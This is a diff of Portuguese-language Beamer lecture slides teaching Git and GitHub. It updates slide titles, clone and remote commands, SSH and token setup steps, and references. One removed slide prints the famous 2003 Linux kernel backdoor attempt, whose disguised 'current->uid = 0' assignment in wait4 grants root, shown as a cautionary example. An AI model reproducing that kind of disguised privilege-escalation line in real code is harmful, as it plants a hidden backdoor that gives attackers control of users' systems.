@@ -117,7 +117,7 @@ projetos/códigos fontes}
 % Slide de apresentação
 \titlepage
 
-\begin{frame}{Motivação (1/4)}
+\begin{frame}{Motivação (1/2)}
 O desenvolvimento de um software é uma atividade de natureza complexa, precisa,
 colaborativa e evolutiva
 \begin{itemize}
@@ -132,7 +132,7 @@ colaborativa e evolutiva
 \end{itemize}
 \end{frame}
 
-\begin{frame}{Motivação (2/4)}
+\begin{frame}{Motivação (2/2)}
 Devido a esta natureza, são necessárias ferramentas que auxiliem no processo de
 codificação, construção, verificação, colaboração e evolução
 \begin{itemize}
@@ -143,63 +143,6 @@ codificação, construção, verificação, colaboração e evolução
     \item Como desfazer uma mudança específica?
     \item Qual mudança ocasionou um bug?
 \end{itemize}
-\end{frame}
-
-\begin{frame}{Motivação (3/4)}
-\begin{itemize}
-    \item Quando uma criança nasce, geralmente cria-se um álbum de fotografias
-    que ilustra a sua evolução
-    \begin{itemize}
-        \item O nascimento, mamando, 1º banho, abrindo os olhos pela 1ª vez,
-        ficando em pé, 1ª papinha, 1ª vez que andou, indo pela 1ª vez para a
-        escola, etc.
-    \end{itemize}
-    \item Por que então não fazer um ``álbum de fotografias'' do seu projeto?
-  \end{itemize}
-\end{frame}
-
-\begin{frame}{Motivação (3/4)}
-\begin{itemize}
-    \item Facilitar o trabalho colaborativo
-    \begin{itemize}
-        \item Gerenciar o conflito entre modificações
-    \end{itemize}
-    \item Facilitar a modificação do código fonte
-    \begin{itemize}
-        \item Backup dos arquivos
-        \item Modificação nos arquivos
-        \item Se a modificação deu errado, restaura o backup
-        \item Depois o desenvolvedor vislumbra como a modificação poderia ter
-        dado certo, mas aí já é tarde        
-        \end{itemize}
-\end{itemize}
-\end{frame}
-
-\begin{frame}[fragile]{Exemplo de precisão da atividade}
-    \href{https://lwn.net/Articles/57135/}{\textbf{Tentativa} de colocar um
-    backdoor no kernel do Linux}
-    \begin{mdframed}[
-        backgroundcolor=black,
-        hidealllines=true,
-        innertopmargin=0pt,
-        innerbottommargin=0pt,
-        innerleftmargin=0pt,
-        innerrightmargin=0pt
-    ]
-    \begin{lstlisting}[style=ccode]
---- GOOD        2003-11-05 13:46:44.000000000 -0800
-+++ BAD 2003-11-05 13:46:53.000000000 -0800
-@@ -1111,6 +1111,8 @@
-                schedule();
-                goto repeat;
-        }
-+       if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
-+                       retval = -EINVAL;
-        retval = -ECHILD;
-    end_wait4:
-        current->state = TASK_RUNNING;
-    \end{lstlisting}
-    \end{mdframed}
 \end{frame}
 
 \begin{frame}{Git (1/2)}
@@ -323,7 +266,7 @@ codificação, construção, verificação, colaboração e evolução
     \end{enumerate}
 \end{frame}
 
-\begin{frame}[fragile]{Configurar nome e e-mail}
+\begin{frame}[fragile]{Configurando nome e e-mail}
     \begin{itemize}
         \item Configurar o nome e o e-mail do desenvolvedor
         \begin{bashcode}
@@ -335,7 +278,7 @@ codificação, construção, verificação, colaboração e evolução
     \end{itemize}
 \end{frame}
 
-\begin{frame}[fragile]{Configurando o proxy}
+\begin{frame}[fragile]{Configurando o proxy (HTTPS)}
     \begin{itemize}
         \item Informe ao git o usuário, senha, o host / endereço IP e porta do
         servidor proxy
@@ -361,11 +304,11 @@ codificação, construção, verificação, colaboração e evolução
         \end{bashcode}
         \item Projeto já existente
         \begin{bashcode}
-            $ git clone <URL>
+            $ git clone <URI>
         \end{bashcode}
         \item Exemplo:
         \begin{bashcode}
-            $ git clone https://github.com/fabriciofx/mandacarupark.git
+            $ git clone git@github.com:fabriciofx/teste.git
         \end{bashcode}
     \end{itemize}
 \end{frame}
@@ -508,6 +451,9 @@ codificação, construção, verificação, colaboração e evolução
         \begin{itemize}
             \item Controle de pendências (issue tracker)
             \item Controle para aceite de modificações (Pull Request)
+            \item Controle de projetos
+            \item Coleção de páginas interligadas e que cada uma delas pode ser
+            visitada e editada por qualquer pessoa (Wiki)
         \end{itemize}
     \end{itemize}
 \end{frame}
@@ -521,6 +467,8 @@ codificação, construção, verificação, colaboração e evolução
             \item Crie um par de chaves SSH (privada e pública)
             \item Adicione sua chave privada ao \texttt{ssh-agent}
             \item Adicione sua chave pública ao GitHub
+            \item Se você executou o \texttt{ssh-agent} só será necessário
+            informar a senha uma única vez
         \end{enumerate}
         \item Via HTTPS
         \begin{enumerate}
@@ -581,8 +529,8 @@ codificação, construção, verificação, colaboração e evolução
         \item Clique em ``Generate new token''
         \item No campo ``Token name'' escolha o nome para seu token
         \item No campo ``Expiration'' escolha por quanto tempo seu token será
-        válido
-        \item 
+        válido (90 dias)
+        \item Em ``Repository access'', escolha \texttt{All repositories}
     \end{enumerate}
 \end{frame}
 
@@ -591,7 +539,7 @@ codificação, construção, verificação, colaboração e evolução
         \item Crie um novo repositório no GitHub
         \item Adicione o repositório remoto
         \begin{bashcode}
-            $ git remote add <repositório-remoto> <URL-do-projeto>            
+            $ git remote add <repositório-remoto> <URI-do-projeto>
         \end{bashcode}
         \item Envie o branch que deseja compartilhar para o repositório remoto
         \begin{bashcode}
@@ -605,13 +553,20 @@ codificação, construção, verificação, colaboração e evolução
         \item Crie um novo repositório no GitHub
         \item Adicione o repositório remoto
         \begin{bashcode}
-            $ git remote add origin https://github.com/fabriciofx/teste.git
+            $ git remote add origin git@github.com:fabriciofx/teste.git
         \end{bashcode}
         \item Envie o branch que deseja compartilhar para o repositório remoto
         \begin{bashcode}
             $ git push origin main
         \end{bashcode}
     \end{enumerate}
+\end{frame}
+
+\begin{frame}{Referências}
+    \begin{itemize}
+        \item \href{https://git-scm.com/}{Página oficial do git}
+        \item \href{https://docs.github.com/en}{GitHub Docs}
+    \end{itemize}
 \end{frame}
 
 \end{document}
